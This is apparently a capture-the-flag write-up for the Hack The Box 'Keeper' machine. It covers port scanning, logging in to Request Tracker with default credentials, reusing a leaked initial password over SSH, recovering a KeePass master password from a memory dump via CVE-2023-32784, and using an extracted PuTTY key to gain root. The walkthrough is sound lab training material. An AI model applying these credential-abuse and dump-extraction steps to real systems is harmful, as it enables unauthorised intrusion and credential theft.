## Recon

```
└─# nmap 10.10.11.227
Nmap scan report for 10.10.11.227
Host is up (3.3s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1234/tcp open  hotline


```

On port 80
`To raise an IT support ticket, please visit tickets.keeper.htb/rt/`
Replace in etc/hosts. and found a login : `http://tickets.keeper.htb/rt/`
As my research deepened, I discovered that the default credentials for RT are set as follows: the default username is 'root,' and the default password is 'password. ' on Google.
here i found users on dashboard:
```
http://tickets.keeper.htb/rt/Admin/Users/Modify.html?id=27
user:lnorgaard
extra info: Helpdesk Agent from Korsbæk
New user. Initial password set to Welcome2023!
```
Now with these informations, i will try ssh login
```
└─# ssh lnorgaard@10.10.11.227
The authenticity of host '10.10.11.227 (10.10.11.227)' can't be established.
ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.
This key is not known by any other names
lnorgaard@10.10.11.227's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have mail.
Last login: Sat Oct  7 16:38:10 2023 from 10.10.14.217
lnorgaard@keeper:~$

```
And here we go. logged in
```
└─# scp lnorgaard@10.10.11.227:passcodes.kdbx .
lnorgaard@10.10.11.227's password: 
passcodes.kdbx                                       100% 3630     3.9KB/s   00:00    
                                                                                       
┌──(root㉿1337)-[/home/…/CTFs/Boot2root/HacktheBox/Machines]
└─# ls
KeePassDumpFull.dmp  passcodes.kdbx
                                                                                       
┌──(root㉿1337)-[/home/…/CTFs/Boot2root/HacktheBox/Machines]
└─# file KeePassDumpFull.dmp 
KeePassDumpFull.dmp: Mini DuMP crash report, 16 streams, Fri May 19 13:46:21 2023, 0x1806 type

```
After some research, a vulnerability (CVE-2023-32784) was found, that would allow to dump the master password from keepass.dmp. However, the dumped password, **dgr*d med fl*de, was incomplete.**
Using the web-based KeePass client at https://app.keeweb.info/, I unlocked the .kdbx file with the password 'rødgrød med fløde'. Inside, I found the contents of a PuTTY PPK file for the root user:

```
┌──(root㉿1337)-[/home/…/CTFs/Boot2root/HacktheBox/Machines]
└─# nano puttyfile.ppk
                                                                                       
┌──(root㉿1337)-[/home/…/CTFs/Boot2root/HacktheBox/Machines]
└─# puttygen puttyfile.ppk -O private-openssh -o id_rsa
                                                                                       
┌──(root㉿1337)-[/home/…/CTFs/Boot2root/HacktheBox/Machines]
└─# ls                   
id_rsa  keepass_dump  KeePassDumpFull.dmp  passcodes.kdbx  puttyfile.ppk
                                                                                       
┌──(root㉿1337)-[/home/…/CTFs/Boot2root/HacktheBox/Machines]
└─# chmod 600 id_rsa       
                                                                                       
┌──(root㉿1337)-[/home/…/CTFs/Boot2root/HacktheBox/Machines]
└─# ls
id_rsa  keepass_dump  KeePassDumpFull.dmp  passcodes.kdbx  puttyfile.ppk
└─# ssh root@10.10.11.227 -i id_rsa 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Sat Oct  7 15:05:45 2023 from 10.10.14.125
root@keeper:~# 
root@keeper:~# whoami
root
root@keeper:~# ls
root.txt  RT30000.zip  SQL
root@keeper:~# cat root.txt 
23ba91a1fa453d466dcf3d89244623a3

```